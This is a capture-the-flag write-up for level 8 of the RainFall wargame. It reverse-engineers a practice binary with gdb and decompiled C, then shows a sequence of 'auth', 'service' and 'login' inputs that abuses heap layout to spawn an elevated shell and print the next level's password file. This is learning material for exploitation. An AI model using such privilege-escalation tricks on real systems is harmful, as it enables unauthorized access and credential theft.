# Level 8

```sh
(gdb) info func
All defined functions:

Non-debugging symbols:
0x080483c4  _init
0x08048410  printf
0x08048410  printf@plt
0x08048420  free
0x08048420  free@plt
0x08048430  strdup
0x08048430  strdup@plt
0x08048440  fgets
0x08048440  fgets@plt
0x08048450  fwrite
0x08048450  fwrite@plt
0x08048460  strcpy
0x08048460  strcpy@plt
0x08048470  malloc
0x08048470  malloc@plt
0x08048480  system
0x08048480  system@plt
0x08048490  __gmon_start__
0x08048490  __gmon_start__@plt
0x080484a0  __libc_start_main
0x080484a0  __libc_start_main@plt
0x080484b0  _start
0x080484e0  __do_global_dtors_aux
0x08048540  frame_dummy
0x08048564  main
0x08048740  __libc_csu_init
0x080487b0  __libc_csu_fini
0x080487b2  __i686.get_pc_thunk.bx
0x080487c0  __do_global_ctors_aux
0x080487ec  _fini
(gdb) 

```

Main is quit big.


```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	push   %edi
   0x08048568 <+4>:	push   %esi
   0x08048569 <+5>:	and    $0xfffffff0,%esp
   0x0804856c <+8>:	sub    $0xa0,%esp
   0x08048572 <+14>:	jmp    0x8048575 <main+17>
   0x08048574 <+16>:	nop
   0x08048575 <+17>:	mov    0x8049ab0,%ecx
   0x0804857b <+23>:	mov    0x8049aac,%edx
   0x08048581 <+29>:	mov    $0x8048810,%eax
   0x08048586 <+34>:	mov    %ecx,0x8(%esp)
   0x0804858a <+38>:	mov    %edx,0x4(%esp)
   0x0804858e <+42>:	mov    %eax,(%esp)
   0x08048591 <+45>:	call   0x8048410 <printf@plt>
   0x08048596 <+50>:	mov    0x8049a80,%eax
   0x0804859b <+55>:	mov    %eax,0x8(%esp)
   0x0804859f <+59>:	movl   $0x80,0x4(%esp)
   0x080485a7 <+67>:	lea    0x20(%esp),%eax
   0x080485ab <+71>:	mov    %eax,(%esp)
   0x080485ae <+74>:	call   0x8048440 <fgets@plt>
   0x080485b3 <+79>:	test   %eax,%eax
   0x080485b5 <+81>:	je     0x804872c <main+456>
   0x080485bb <+87>:	lea    0x20(%esp),%eax
   0x080485bf <+91>:	mov    %eax,%edx
   0x080485c1 <+93>:	mov    $0x8048819,%eax
   0x080485c6 <+98>:	mov    $0x5,%ecx
   0x080485cb <+103>:	mov    %edx,%esi
   0x080485cd <+105>:	mov    %eax,%edi
   0x080485cf <+107>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x080485d1 <+109>:	seta   %dl
   0x080485d4 <+112>:	setb   %al
   0x080485d7 <+115>:	mov    %edx,%ecx
   0x080485d9 <+117>:	sub    %al,%cl
   0x080485db <+119>:	mov    %ecx,%eax
   0x080485dd <+121>:	movsbl %al,%eax
   0x080485e0 <+124>:	test   %eax,%eax
   0x080485e2 <+126>:	jne    0x8048642 <main+222>
   0x080485e4 <+128>:	movl   $0x4,(%esp)
   0x080485eb <+135>:	call   0x8048470 <malloc@plt>
   0x080485f0 <+140>:	mov    %eax,0x8049aac
   0x080485f5 <+145>:	mov    0x8049aac,%eax
   0x080485fa <+150>:	movl   $0x0,(%eax)
   0x08048600 <+156>:	lea    0x20(%esp),%eax
   0x08048604 <+160>:	add    $0x5,%eax
   0x08048607 <+163>:	movl   $0xffffffff,0x1c(%esp)
   0x0804860f <+171>:	mov    %eax,%edx
   0x08048611 <+173>:	mov    $0x0,%eax
   0x08048616 <+178>:	mov    0x1c(%esp),%ecx
   0x0804861a <+182>:	mov    %edx,%edi
   0x0804861c <+184>:	repnz scas %es:(%edi),%al
   0x0804861e <+186>:	mov    %ecx,%eax
   0x08048620 <+188>:	not    %eax
   0x08048622 <+190>:	sub    $0x1,%eax
   0x08048625 <+193>:	cmp    $0x1e,%eax
   0x08048628 <+196>:	ja     0x8048642 <main+222>
   0x0804862a <+198>:	lea    0x20(%esp),%eax
   0x0804862e <+202>:	lea    0x5(%eax),%edx
---Type <return> to continue, or q <return> to quit---
   0x08048631 <+205>:	mov    0x8049aac,%eax
   0x08048636 <+210>:	mov    %edx,0x4(%esp)
   0x0804863a <+214>:	mov    %eax,(%esp)
   0x0804863d <+217>:	call   0x8048460 <strcpy@plt>
   0x08048642 <+222>:	lea    0x20(%esp),%eax
   0x08048646 <+226>:	mov    %eax,%edx
   0x08048648 <+228>:	mov    $0x804881f,%eax
   0x0804864d <+233>:	mov    $0x5,%ecx
   0x08048652 <+238>:	mov    %edx,%esi
   0x08048654 <+240>:	mov    %eax,%edi
   0x08048656 <+242>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x08048658 <+244>:	seta   %dl
   0x0804865b <+247>:	setb   %al
   0x0804865e <+250>:	mov    %edx,%ecx
   0x08048660 <+252>:	sub    %al,%cl
   0x08048662 <+254>:	mov    %ecx,%eax
   0x08048664 <+256>:	movsbl %al,%eax
   0x08048667 <+259>:	test   %eax,%eax
   0x08048669 <+261>:	jne    0x8048678 <main+276>
   0x0804866b <+263>:	mov    0x8049aac,%eax
   0x08048670 <+268>:	mov    %eax,(%esp)
   0x08048673 <+271>:	call   0x8048420 <free@plt>
   0x08048678 <+276>:	lea    0x20(%esp),%eax
   0x0804867c <+280>:	mov    %eax,%edx
   0x0804867e <+282>:	mov    $0x8048825,%eax
   0x08048683 <+287>:	mov    $0x6,%ecx
   0x08048688 <+292>:	mov    %edx,%esi
   0x0804868a <+294>:	mov    %eax,%edi
   0x0804868c <+296>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x0804868e <+298>:	seta   %dl
   0x08048691 <+301>:	setb   %al
   0x08048694 <+304>:	mov    %edx,%ecx
   0x08048696 <+306>:	sub    %al,%cl
   0x08048698 <+308>:	mov    %ecx,%eax
   0x0804869a <+310>:	movsbl %al,%eax
   0x0804869d <+313>:	test   %eax,%eax
   0x0804869f <+315>:	jne    0x80486b5 <main+337>
   0x080486a1 <+317>:	lea    0x20(%esp),%eax
   0x080486a5 <+321>:	add    $0x7,%eax
   0x080486a8 <+324>:	mov    %eax,(%esp)
   0x080486ab <+327>:	call   0x8048430 <strdup@plt>
   0x080486b0 <+332>:	mov    %eax,0x8049ab0
   0x080486b5 <+337>:	lea    0x20(%esp),%eax
   0x080486b9 <+341>:	mov    %eax,%edx
   0x080486bb <+343>:	mov    $0x804882d,%eax
   0x080486c0 <+348>:	mov    $0x5,%ecx
   0x080486c5 <+353>:	mov    %edx,%esi
   0x080486c7 <+355>:	mov    %eax,%edi
   0x080486c9 <+357>:	repz cmpsb %es:(%edi),%ds:(%esi)
   0x080486cb <+359>:	seta   %dl
   0x080486ce <+362>:	setb   %al
   0x080486d1 <+365>:	mov    %edx,%ecx
   0x080486d3 <+367>:	sub    %al,%cl
   0x080486d5 <+369>:	mov    %ecx,%eax
   0x080486d7 <+371>:	movsbl %al,%eax
   0x080486da <+374>:	test   %eax,%eax
   0x080486dc <+376>:	jne    0x8048574 <main+16>
   0x080486e2 <+382>:	mov    0x8049aac,%eax
   0x080486e7 <+387>:	mov    0x20(%eax),%eax
---Type <return> to continue, or q <return> to quit---
   0x080486ea <+390>:	test   %eax,%eax
   0x080486ec <+392>:	je     0x80486ff <main+411>
   0x080486ee <+394>:	movl   $0x8048833,(%esp)
   0x080486f5 <+401>:	call   0x8048480 <system@plt>
   0x080486fa <+406>:	jmp    0x8048574 <main+16>
   0x080486ff <+411>:	mov    0x8049aa0,%eax
   0x08048704 <+416>:	mov    %eax,%edx
   0x08048706 <+418>:	mov    $0x804883b,%eax
   0x0804870b <+423>:	mov    %edx,0xc(%esp)
   0x0804870f <+427>:	movl   $0xa,0x8(%esp)
   0x08048717 <+435>:	movl   $0x1,0x4(%esp)
   0x0804871f <+443>:	mov    %eax,(%esp)
   0x08048722 <+446>:	call   0x8048450 <fwrite@plt>
   0x08048727 <+451>:	jmp    0x8048574 <main+16>
   0x0804872c <+456>:	nop
   0x0804872d <+457>:	mov    $0x0,%eax
   0x08048732 <+462>:	lea    -0x8(%ebp),%esp
   0x08048735 <+465>:	pop    %esi
   0x08048736 <+466>:	pop    %edi
   0x08048737 <+467>:	pop    %ebp
   0x08048738 <+468>:	ret    
End of assembler dump.
(gdb)
```

```c
undefined4 main(void)

{
  char cVar1;
  char *pcVar2;
  int iVar3;
  uint uVar4;
  byte *pbVar5;
  byte *pbVar6;
  bool bVar7;
  undefined uVar8;
  undefined uVar9;
  bool bVar10;
  undefined uVar11;
  byte bVar12;
  byte local_90 [5];
  char local_8b [2];
  char acStack_89 [125];
  
  bVar12 = 0;
  do {
    printf("%p, %p \n",auth,service);
    pcVar2 = fgets((char *)local_90,0x80,stdin);
    bVar7 = false;
    bVar10 = pcVar2 == (char *)0x0;
    if (bVar10) {
      return 0;
    }
    iVar3 = 5;
    pbVar5 = local_90;
    pbVar6 = (byte *)"auth ";
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      bVar7 = *pbVar5 < *pbVar6;
      bVar10 = *pbVar5 == *pbVar6;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
    } while (bVar10);
    uVar8 = 0;
    uVar11 = (!bVar7 && !bVar10) == bVar7;
    if ((bool)uVar11) {
      auth = (undefined4 *)malloc(4);
      *auth = 0;
      uVar4 = 0xffffffff;
      pcVar2 = local_8b;
      do {
        if (uVar4 == 0) break;
        uVar4 = uVar4 - 1;
        cVar1 = *pcVar2;
        pcVar2 = pcVar2 + (uint)bVar12 * -2 + 1;
      } while (cVar1 != '\0');
      uVar4 = ~uVar4 - 1;
      uVar8 = uVar4 < 0x1e;
      uVar11 = uVar4 == 0x1e;
      if (uVar4 < 0x1f) {
        strcpy((char *)auth,local_8b);
      }
    }
    iVar3 = 5;
    pbVar5 = local_90;
    pbVar6 = (byte *)"reset";
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      uVar8 = *pbVar5 < *pbVar6;
      uVar11 = *pbVar5 == *pbVar6;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
    } while ((bool)uVar11);
    uVar9 = 0;
    uVar8 = (!(bool)uVar8 && !(bool)uVar11) == (bool)uVar8;
    if ((bool)uVar8) {
      free(auth);
    }
    iVar3 = 6;
    pbVar5 = local_90;
    pbVar6 = (byte *)"service";
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      uVar9 = *pbVar5 < *pbVar6;
      uVar8 = *pbVar5 == *pbVar6;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
    } while ((bool)uVar8);
    uVar11 = 0;
    uVar8 = (!(bool)uVar9 && !(bool)uVar8) == (bool)uVar9;
    if ((bool)uVar8) {
      uVar11 = (byte *)0xfffffff8 < local_90;
      uVar8 = acStack_89 == (char *)0x0;
      service = strdup(acStack_89);
    }
    iVar3 = 5;
    pbVar5 = local_90;
    pbVar6 = (byte *)"login";
    do {
      if (iVar3 == 0) break;
      iVar3 = iVar3 + -1;
      uVar11 = *pbVar5 < *pbVar6;
      uVar8 = *pbVar5 == *pbVar6;
      pbVar5 = pbVar5 + (uint)bVar12 * -2 + 1;
      pbVar6 = pbVar6 + (uint)bVar12 * -2 + 1;
    } while ((bool)uVar8);
    if ((!(bool)uVar11 && !(bool)uVar8) == (bool)uVar11) {
      if (auth[8] == 0) {
        fwrite("Password:\n",1,10,stdout);
      }
      else {
        system("/bin/sh");
      }
    }
  } while( true );
}
```


And the source seems very complicated to undurstand.

The programs end up by checking some variable, and execute a shell for us 

It seems that the program reads input, and look for keyword like "auth", "login", "reset" or "service".

We might to find the right combination of input in order to make him execute a shell.

```sh
level8@RainFall:~$ ./level8 
(nil), (nil) 
lol
(nil), (nil) 
lol
(nil), (nil) 
lol
(nil), (nil) 
lo
(nil), (nil) 
ll^C
level8@RainFall:~$
```

The program just prints (nil) in the output.


```sh
level8@RainFall:~$ ./level8 
(nil), (nil) 
reset
(nil), (nil) 
service
(nil), 0x804a008 
service
(nil), 0x804a018 
vice
(nil), 0x804a018 
service
(nil), 0x804a028 
auth
(nil), 0x804a028 
login
Segmentation fault (core dumped)
level8@RainFall:~$ 
```


Lets unite the condition we need to met in order to exec the shell, using the reversed source code.

```c
if ( (!(bool)uVar11 && !(bool)uVar8) == (bool)uVar11 ) 
{
      if (auth[8] == 0) 
      {
        fwrite("Password:\n",1,10,stdout);
      }
      else 
      {
        system("/bin/sh");
      }
}
```

uVar11 as bool must not exist, and uVar8 as bool must be different from uVar11.

After that auth[8] must different from 0 to exec the shell, lets see what we can do.

After every input, the program print us the addresses of the 'service' and 'auth' variable, they seems to get a value when we type their input :


```sh
level8@RainFall:~$ ./level8
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018
```

Important to note that the auth input need a space after the 'h' like so "auth ".

```sh
level8@RainFall:~$ ./level8
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
login
Password:
0x804a008, 0x804a018
```

If the auth variable is (nil) we will segfault since the if check the auth variable.

```sh
level8@RainFall:~$ ./level8
(nil), (nil) 
service
(nil), 0x804a008 
login
Segmentation fault (core dumped)
level8@RainFall:~$ 
```

```sh
level8@RainFall:~$ ./level8
(nil), (nil) 
auth 
0x804a008, (nil) 
auth 
0x804a018, (nil) 
auth 
0x804a028, (nil) 
auth 
0x804a038, (nil) 
auth 
0x804a048, (nil) 
auth 
0x804a058, (nil) 
auth 
0x804a068, (nil)

service
0x804a068, 0x804a078 
service
0x804a068, 0x804a088 
service
0x804a068, 0x804a098
``` 

After each time we give the input, the adresses seems to move foward.

Lets try logging in with this input :


```sh
level8@RainFall:~$ ./level8
(nil), (nil) 
auth 
0x804a008, (nil) 
auth 
0x804a018, (nil) 
auth 
0x804a028, (nil) 
auth 
0x804a038, (nil) 
auth 
0x804a048, (nil) 
auth 
0x804a058, (nil) 
auth 
0x804a068, (nil) 
login
Password:
0x804a068, (nil) 
login
Password:
0x804a068, (nil) 
service
0x804a068, 0x804a078 
service
0x804a068, 0x804a088 
service
0x804a068, 0x804a098 
login
$ id
uid=2008(level8) gid=2008(level8) euid=2009(level9) egid=100(users) groups=2009(level9),100(users),2008(level8)
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
$
```

It worked kind randomly, but its easy to guess that we just had to read the source code in order to know the good combination of input to get out flag.

I guess this level shows us that, by reverse a binary, we can learn his working flow and exploit it, so no exploit this time.